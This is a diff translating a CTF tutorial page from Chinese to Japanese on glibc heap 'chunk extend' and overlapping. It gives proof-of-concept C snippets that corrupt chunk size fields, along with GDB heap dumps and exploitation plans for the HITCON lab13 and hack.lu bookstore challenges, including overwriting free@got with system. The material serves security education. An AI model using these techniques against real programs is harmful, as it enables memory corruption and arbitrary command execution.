@@ -1,15 +1,15 @@
 # Chunk Extend and Overlapping
 
-## 介绍
-chunk extend是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping的效果。这种利用方法需要以下的时机和条件：
+## はじめに
+chunk extend はヒープ脆弱性の一般的な攻撃手法で、extend によって chunk overlapping の効果を実現できます。この攻撃手法には、次のタイミングと条件が必要です。
 
-* 程序中存在基于堆的漏洞
-* 漏洞可以控制 chunk header 中的数据
+* プログラムにヒープベースの脆弱性が存在する
+* その脆弱性で chunk header 内のデータを制御できる
 
 ## 原理
-chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏。
+chunk extend 技術が成立するのは、ptmalloc がヒープの chunk を操作する際に使うさまざまなマクロが理由です。
 
-在ptmalloc中，获取 chunk 块大小的操作如下
+ptmalloc で chunk のサイズを取得する操作は次のとおりです。
 ```
 /* Get size, ignoring use bits */
 #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))
@@ -17,16 +17,16 @@ chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作�
 /* Like chunksize, but do not mask SIZE_BITS.  */
 #define chunksize_nomask(p) ((p)->mchunk_size)
 ```
-一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。
+1つ目は chunk のサイズをそのまま取得するもので、マスク部分を無視しません。もう1つはマスク部分を無視するものです。
 
-在 ptmalloc 中，获取下一 chunk 块地址的操作如下
+ptmalloc で次の chunk のアドレスを取得する操作は次のとおりです。
 ```
 /* Ptr to next physical malloc_chunk. */
 #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
 ```
-即使用当前块指针加上当前块大小。
+つまり、現在の chunk のポインタに現在の chunk のサイズを足します。
 
-在 ptmalloc 中，获取前一个 chunk 信息的操作如下
+ptmalloc で前の chunk の情報を取得する操作は次のとおりです。
 ```
 /* Size of the chunk below P.  Only valid if prev_inuse (P).  */
 #define prev_size(p) ((p)->mchunk_prev_size)
@@ -34,40 +34,40 @@ chunk extend技术能够产生的原因在于ptmalloc在对堆chunk进行操作�
 /* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
 #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
 ```
-即通过malloc_chunk->prev_size获取前一块大小，然后使用本 chunk 地址减去所得大小。
+つまり、malloc_chunk->prev_size で前の chunk のサイズを取得し、この chunk のアドレスから、得られたサイズを引きます。
 
-在 ptmalloc，判断当前 chunk 是否是use状态的操作如下：
+ptmalloc で、現在の chunk が使用中(use)状態かどうかを判定する操作は次のとおりです。
 ```
 #define inuse(p)
     ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
 ```
-即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。
+つまり、次の chunk の prev_inuse フィールドを調べます。そして、次の chunk のアドレスは、先ほど述べたとおり、現在の chunk の size から計算されます。
 
-更多的操作详见 `堆相关数据结构` 一节。
+その他の操作の詳細は、「ヒープ関連のデータ構造」の節を参照してください。
 
-通过上面几个宏可以看出，ptmalloc通过chunk header的数据判断chunk的使用情况和对chunk的前后块进行定位。简而言之，chunk extend就是通过控制size和pre_size域来实现跨越块操作从而导致overlapping的。
+これらのマクロから分かるように、ptmalloc は chunk header のデータによって chunk の使用状況を判断し、前後の chunk の位置を特定しています。要するに、chunk extend とは、size フィールドと pre_size フィールドを制御することで chunk をまたぐ操作を行い、その結果 overlapping を引き起こす手法です。
 
-与chunk extend类似的还有一种称为chunk shrink的操作。这里只介绍chunk extend的利用。
+chunk extend に似た操作として、chunk shrink と呼ばれるものもあります。ここでは chunk extend の利用のみを紹介します。
 
-## 基本示例1：对inuse的fastbin进行extend
-简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。
-**注意，我们的示例都是在64位的程序。如果想在32位下进行测试，可以把8字节偏移改为4字节**。
+## 基本例1:使用中の fastbin に対する extend
+簡単に言うと、この攻撃の効果は、1つ目の chunk のサイズを書き換えることで2つ目の chunk の内容を制御することです。
+**注意:例はすべて64ビットのプログラムです。32ビットでテストしたい場合は、8バイトのオフセットを4バイトに変えてください**。
 ```
 int main(void)
 {
     void *ptr,*ptr1;
     
-    ptr=malloc(0x10);//分配第一个0x10的chunk
-    malloc(0x10);//分配第二个0x10的chunk
+    ptr=malloc(0x10);//1つ目の 0x10 の chunk を確保
+    malloc(0x10);//2つ目の 0x10 の chunk を確保
     
-    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域
+    *(long long *)((long long)ptr-0x8)=0x41;// 1つ目の chunk の size フィールドを変更
     
     free(ptr);
-    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
+    ptr1=malloc(0x30);// extend を実現し、2つ目の chunk の内容を制御した
     return 0;
 }
 ```
-当两个malloc语句执行之后，堆的内存分布如下
+2つの malloc 文を実行した後のヒープのメモリ配置は次のとおりです。
 ```
 0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk 1
 0x602010:	0x0000000000000000	0x0000000000000000
@@ -75,7 +75,7 @@ int main(void)
 0x602030:	0x0000000000000000	0x0000000000000000
 0x602040:	0x0000000000000000	0x0000000000020fc1 <=== top chunk
 ```
-之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为0x40。在题目中这一步可以由堆溢出得到。
+その後、chunk1 の size フィールドを 0x41 に書き換えます。0x41 としたのは、chunk の size フィールドにはユーザーが指定したサイズと header のサイズが含まれるためです。上に示したとおり、ちょうど 0x40 になります。問題では、この手順はヒープオーバーフローで行えます。
 ```
 0x602000:	0x0000000000000000	0x0000000000000041 <=== 篡改大小
 0x602010:	0x0000000000000000	0x0000000000000000
@@ -83,7 +83,7 @@ int main(void)
 0x602030:	0x0000000000000000	0x0000000000000000
 0x602040:	0x0000000000000000	0x0000000000020fc1 
 ```
-执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。
+free を実行すると、chunk2 が chunk1 と合わさって 0x40 サイズの 1 つの chunk となり、まとめて解放されていることが分かります。
 ```
 Fastbins[idx=0, size=0x10] 0x00
 Fastbins[idx=1, size=0x20] 0x00
@@ -93,7 +93,7 @@ Fastbins[idx=4, size=0x50] 0x00
 Fastbins[idx=5, size=0x60] 0x00
 Fastbins[idx=6, size=0x70] 0x00
 ```
-之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制chunk2中的内容，我们也把这种状态称为 overlapping chunk。
+その後 malloc(0x30) を呼ぶと chunk1+chunk2 の領域が得られ、chunk2 の中身を直接制御できます。この状態を overlapping chunk とも呼びます。
 ```
 call   0x400450 <malloc@plt>
 mov    QWORD PTR [rbp-0x8], rax
@@ -101,24 +101,24 @@ mov    QWORD PTR [rbp-0x8], rax
 rax = 0x602010
 ```
 
-## 基本示例2：对inuse的smallbin进行extend
-通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于unsorted bin链表中。
-以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是0x70）
+## 基本例2:使用中の smallbin に対する extend
+先に学んだヒープの実装の深い理解の部分から、fastbin の範囲にある chunk は解放後に fastbin のリストへ入り、この範囲にない chunk は解放後に unsorted bin のリストへ入ることが分かっています。
+次の例では、サイズ 0x80 でヒープを確保します(比較のため述べると、fastbin のデフォルトの最大 chunk サイズは 0x70 です)。
 ```
 int main()
 {
     void *ptr,*ptr1;
     
-    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
-    malloc(0x10); //分配第二个 0x10 的chunk2
-    malloc(0x10); //防止与top chunk合并
+    ptr=malloc(0x80);//1つ目の 0x80 の chunk1 を確保
+    malloc(0x10); //2つ目の 0x10 の chunk2 を確保
+    malloc(0x10); //top chunk との統合を防ぐ
     
     *(int *)((int)ptr-0x8)=0xb1;
     free(ptr);
     ptr1=malloc(0xa0);
 }
 ```
-在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和top chunk合并。所以我们需要额外分配一个chunk，把释放的块与top chunk隔开。
+この例では、確保する size が fastbin の範囲にないため、解放時に top chunk と隣接していると top chunk に統合されてしまいます。そのため、追加で chunk を 1 つ確保し、解放する chunk を top chunk から隔てる必要があります。
 ```
 0x602000:	0x0000000000000000	0x00000000000000b1 <===chunk1 篡改size域
 0x602010:	0x0000000000000000	0x0000000000000000
@@ -135,7 +135,7 @@ int main()
 0x6020c0:	0x0000000000000000	0x0000000000000000
 0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
 ```
-释放后，chunk1 把 chunk2 的内容吞并掉并一起置入unsorted bin
+解放後、chunk1 は chunk2 の内容を飲み込み、一緒に unsorted bin へ入ります。
 ```
 0x602000:	0x0000000000000000	0x00000000000000b1 <=== 被放入unsorted bin
 0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
@@ -156,7 +156,7 @@ int main()
 [+] unsorted_bins[0]: fw=0x602000, bk=0x602000
  →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
 ```
-再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容
+再度確保すると chunk1 と chunk2 の領域が取り出されるため、chunk2 の中身を制御できるようになります。
 ```
      0x4005b0 <main+74>        call   0x400450 <malloc@plt>
  →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax
@@ -164,23 +164,23 @@ int main()
      rax : 0x0000000000602010
 ```
 
-## 基本示例3：对free的smallbin进行extend
-示例3是在示例2的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的size域。
+## 基本例3:解放済みの smallbin に対する extend
+例3は例2を土台にしたもので、今回は先に chunk1 を解放し、その後 unsorted bin にある chunk1 の size フィールドを書き換えます。
 ```
 int main()
 {
     void *ptr,*ptr1;
     
-    ptr=malloc(0x80);//分配第一个0x80的chunk1
-    malloc(0x10);//分配第二个0x10的chunk2
+    ptr=malloc(0x80);//1つ目の 0x80 の chunk1 を確保
+    malloc(0x10);//2つ目の 0x10 の chunk2 を確保
     
-    free(ptr);//首先进行释放，使得chunk1进入unsorted bin
+    free(ptr);//まず解放して chunk1 を unsorted bin に入れる
     
     *(int *)((int)ptr-0x8)=0xb1;
     ptr1=malloc(0xa0);
 }
 ```
-两次 malloc 之后的结果如下
+2回の malloc の後の結果は次のとおりです。
 ```
 0x602000:	0x0000000000000000	0x0000000000000091 <=== chunk 1
 0x602010:	0x0000000000000000	0x0000000000000000
@@ -195,7 +195,7 @@ int main()
 0x6020a0:	0x0000000000000000	0x0000000000000000
 0x6020b0:	0x0000000000000000	0x0000000000020f51
 ```
-我们首先释放chunk1使它进入unsorted bin中
+まず chunk1 を解放して unsorted bin に入れます。
 ```
      unsorted_bins[0]: fw=0x602000, bk=0x602000
  →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)
@@ -213,7 +213,7 @@ int main()
 0x6020a0:	0x0000000000000000	0x0000000000000000
 0x6020b0:	0x0000000000000000	0x0000000000020f51 <=== top chunk
 ```
-然后篡改chunk1的size域
+次に chunk1 の size フィールドを書き換えます。
 ```
 0x602000:	0x0000000000000000	0x00000000000000b1 <=== size域被篡改
 0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
@@ -228,34 +228,34 @@ int main()
 0x6020a0:	0x0000000000000000	0x0000000000000000
 0x6020b0:	0x0000000000000000	0x0000000000020f51
 ```
-此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了chunk2 的内容。
+この状態で malloc で確保すると chunk1+chunk2 のヒープ領域が得られ、chunk2 の中身を制御できます。
 
-## Chunk Extend/Shrink 可以做什么  
+## Chunk Extend/Shrink でできること
 
-一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制chunk中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。
+一般に、この技術でプログラムの実行フローを直接制御することはできませんが、chunk の中身を制御できます。chunk に文字列ポインタや関数ポインタなどがあれば、それらのポインタを使って情報の漏えいや実行フローの制御ができます。
 
-此外通过extend可以实现chunk overlapping，通过overlapping可以控制chunk的fd/bk指针从而可以实现 fastbin attack 等利用。
+また、extend によって chunk overlapping を実現でき、overlapping を通じて chunk の fd/bk ポインタを制御できるため、fastbin attack などの攻撃が可能になります。
 
-## 基本示例4：通过extend后向overlapping
-这里展示通过extend进行后向overlapping，这也是在CTF中最常出现的情况，通过overlapping可以实现其它的一些利用。
+## 基本例4:extend による後方 overlapping
+ここでは extend による後方 overlapping を示します。これは CTF で最もよく出てくる状況で、overlapping を通じてほかのさまざまな攻撃が可能になります。
 ```
 int main()
 {
     void *ptr,*ptr1;
     
-    ptr=malloc(0x10);//分配第1个 0x80 的chunk1
-    malloc(0x10); //分配第2个 0x10 的chunk2
-    malloc(0x10); //分配第3个 0x10 的chunk3
-    malloc(0x10); //分配第4个 0x10 的chunk4    
+    ptr=malloc(0x10);//1つ目の 0x80 の chunk1 を確保
+    malloc(0x10); //2つ目の 0x10 の chunk2 を確保
+    malloc(0x10); //3つ目の 0x10 の chunk3 を確保
+    malloc(0x10); //4つ目の 0x10 の chunk4 を確保    
     *(int *)((int)ptr-0x8)=0x61;
     free(ptr);
     ptr1=malloc(0x50);
 }
 ```
-在malloc(0x50)对extend区域重新占位后，其中0x10的fastbin块依然可以正常的分配和释放，此时已经构成overlapping，通过对overlapping的进行操作可以实现fastbin attack。
+malloc(0x50) で extend した領域を再び埋めた後も、その中の 0x10 の fastbin の chunk は通常どおり確保・解放できます。この時点ですでに overlapping が成立しており、overlapping に対して操作することで fastbin attack を実現できます。
 
-## 基本示例5：通过extend前向overlapping
-这里展示通过修改pre_inuse域和pre_size域实现合并前面的块
+## 基本例5:extend による前方 overlapping
+ここでは、pre_inuse フィールドと pre_size フィールドを書き換えて、前方の chunk を統合する方法を示します。
 ```
 int main(void)
 {
@@ -264,21 +264,21 @@ int main(void)
 	ptr2=malloc(0x10);//fastbin1
 	ptr3=malloc(0x10);//fastbin2
 	ptr4=malloc(128);//smallbin2
-	malloc(0x10);//防止与top合并
+	malloc(0x10);//top との統合を防ぐ
 	free(ptr1);
-	*(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
-	*(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
-	free(ptr4);//unlink进行前向extend
-	malloc(0x150);//占位块
+	*(int *)((long long)ptr4-0x8)=0x90;//pre_inuse フィールドを変更
+	*(int *)((long long)ptr4-0x10)=0xd0;//pre_size フィールドを変更
+	free(ptr4);//unlink による前方 extend
+	malloc(0x150);//場所を埋める chunk
 	
 }
 ```
-前向extend利用了smallbin的unlink机制，通过修改pre_size域可以跨越多个chunk进行合并实现overlapping。
+前方 extend は smallbin の unlink の仕組みを利用します。pre_size フィールドを書き換えることで、複数の chunk をまたいで統合し、overlapping を実現できます。
 
 ## HITCON Training lab13
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13)
 
-### 基本信息
+### 基本情報
 
 ```shell
 ➜  hitcontraning_lab13 git:(master) file heapcreator
@@ -292,25 +292,25 @@ heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically li
     PIE:      No PIE (0x400000)
 ```
 
-程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。
+プログラムは64ビットの動的リンクプログラムで、主に Canary と NX が有効です。
 
-### 基本功能
+### 基本機能
 
-程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下
+プログラムはおおよそ独自のヒープアロケータで、各ヒープには主に2つのメンバがあります。サイズと内容へのポインタです。主な機能は次のとおりです。
 
-1. 创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。
-2. 编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会**存在 off by one 的漏洞**。
-3. 展示堆，输出指定索引堆的大小以及内容。
-4. 删除堆，删除指定堆，并且将对应指针设置为了 NULL。
+1. ヒープの作成。ユーザーが入力した長さに応じて対応するメモリ領域を確保し、read で指定した長さの内容を読み込みます。ここで長さは検査されておらず、長さが負数のとき、任意の長さのヒープオーバーフローという脆弱性が生じます。もちろん、前提として malloc できる必要があります。また、読み込み後に NULL を設定していません。
+2. ヒープの編集。指定したインデックスと、以前に保存したヒープのサイズに基づいて内容を読み込みますが、読み込む長さが以前より 1 大きいため、**off by one の脆弱性があります**。
+3. ヒープの表示。指定したインデックスのヒープのサイズと内容を出力します。
+4. ヒープの削除。指定したヒープを削除し、対応するポインタを NULL に設定します。
 
-### 利用
+### 攻撃
 
-基本利用思路如下
+基本的な攻撃の流れは次のとおりです。
 
-1. 利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。
-2. 申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。
+1. off by one の脆弱性を利用して次の chunk の size フィールドを上書きし、偽の chunk サイズを作る。
+2. 偽の chunk サイズで確保して chunk overlap を発生させ、さらに重要なポインタを書き換える。
 
-更加具体的还是直接看脚本吧。
+より具体的には、スクリプトを直接見てください。
 
 ```python
 #!/usr/bin/env python
@@ -386,9 +386,9 @@ r.interactive()
 ```
 
 ## 2015 hacklu bookstore
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2015_hacklu_bookstore)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2015_hacklu_bookstore)
 
-### 基本信息
+### 基本情報
 
 ```shell
 ➜  2015_hacklu_bookstore git:(master) file books    
@@ -402,29 +402,29 @@ books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
     PIE:      No PIE (0x400000)
 ```
 
-可以看出该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护。
+このプログラムは動的リンクの64ビットプログラムで、主に Canary と NX が有効であることが分かります。
 
-### 基本功能
+### 基本機能
 
-该程序的主要功能是订书，具体如下
+このプログラムの主な機能は本の注文で、具体的には次のとおりです。
 
-- 最多可以订购两本书。
-- 根据编号来选择订购第几本书，可以为每本书添加对应的名字。然而在添加名字处出现了任意长度堆溢出的漏洞。
-- 根据编号来删除 order，但是这里只是单纯地 free 掉，并没有置为 NULL，因此会出现 use after free 的漏洞。
-- 提交订单，将两本书的名字合在一起。这里由于上面堆溢出的问题，这里也会出现堆溢出的漏洞。
-- 此外，在程序退出之前存在一个**格式化字符串漏洞**。
+- 最大で2冊まで注文できる。
+- 番号で何冊目の本を注文するかを選び、本ごとに名前を付けられる。しかし、名前を付ける部分に任意の長さのヒープオーバーフローの脆弱性がある。
+- 番号で order を削除できるが、ここでは単に free するだけで NULL にしていないため、use after free の脆弱性が生じる。
+- 注文を提出(submit)すると、2冊の本の名前を連結する。上のヒープオーバーフローの問題のため、ここでもヒープオーバーフローが生じる。
+- このほか、プログラムが終了する前に**書式文字列脆弱性**がある。
 
-这里虽然程序的漏洞能力很强，但是所有进行 malloc 的大小都是完全固定的，我们只能借助这些分配的 chunk 来进行操作。
+このプログラムの脆弱性は強力ですが、malloc するサイズはすべて完全に固定されており、確保された chunk を使って操作するしかありません。
 
-### 利用思路
+### 攻撃の考え方
 
-程序中主要的漏洞在于堆溢出和格式化字符串漏洞，但是如果想要利用格式化字符串漏洞，必然需要溢出对应的dest 数组。具体思路如下
+プログラムの主な脆弱性はヒープオーバーフローと書式文字列脆弱性ですが、書式文字列脆弱性を利用するには、対応する dest 配列をオーバーフローさせる必要があります。具体的な考え方は次のとおりです。
 
-1. 利用堆溢出进行 chunk extend，使得在 submit 中 `malloc(0x140uLL)` 时，恰好返回第二个订单处的位置。在 submit 之前，布置好堆内存布局，使得把字符串拼接后恰好可以覆盖 dest 为指定的格式化字符串。
-2. 通过构造 dest 为指定的格式化字符串：一方面泄漏 __libc_start_main_ret 的地址，**一方面控制程序重新返回执行**。这时，便可以知道 libc 基地址，system 等地址。需要注意的是由于一旦 submit 之后，程序就会直接直接退出，所以我们比较好的思路就是修改 fini_array 中的变量，以便于达到程序执行完毕后，**重新返回我们期待的位置**。这里我们会使用一个trick，程序每次读取选择的时候会读取 128 大小，在栈上。而程序最后在输出 dest 的时候，之前所读取的那部分选择必然是在栈上的，所以我们如果我们在栈上预先布置好一些控制流指针，那就可以来控制程序的执行流程。
-3. 再次利用格式化字符串漏洞，覆盖 free@got 为 system 地址，从而达到任意命令执行的目的。
+1. ヒープオーバーフローで chunk extend を行い、submit 内の `malloc(0x140uLL)` がちょうど2番目の order の位置を返すようにする。submit の前にヒープのメモリレイアウトを整えておき、文字列を連結した結果、dest がちょうど指定の書式文字列で上書きされるようにする。
+2. dest を指定の書式文字列に仕立てる。これにより、一方で __libc_start_main_ret のアドレスを漏えいさせ、**もう一方でプログラムを再び実行に戻らせます**。こうして libc のベースアドレスや system などのアドレスが分かります。注意点として、submit するとプログラムはそのまま終了してしまうため、よい方法は fini_array 内の値を書き換え、プログラムの実行完了後に**期待する位置へ再び戻る**ようにすることです。ここではあるトリックを使います。プログラムは選択を読み込むたびに 128 バイトをスタック上に読み込みます。そしてプログラムが最後に dest を出力するとき、先に読み込んだ選択の部分は必ずスタック上にあるため、スタック上にあらかじめ制御フローのポインタを仕込んでおけば、プログラムの実行フローを制御できます。
+3. もう一度書式文字列脆弱性を使い、free@got を system のアドレスで上書きして、任意のコマンド実行を達成する。
 
-这里，各个参数的偏移是
+ここで、各引数のオフセットは次のとおりです。
 
 - Fini_array0 : 5+8=13
 - __libc_start_main_ret : 5+0x1a=31。
@@ -457,9 +457,9 @@ books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
 1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax
 ```
 
-**！！！待补充！！！**
+**!!!追記予定!!!**
 
-## 题目
+## 問題
 
 - [2016 Nuit du Hack CTF Quals : night deamonic heap](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2016_NuitduHack_nightdeamonicheap)
 
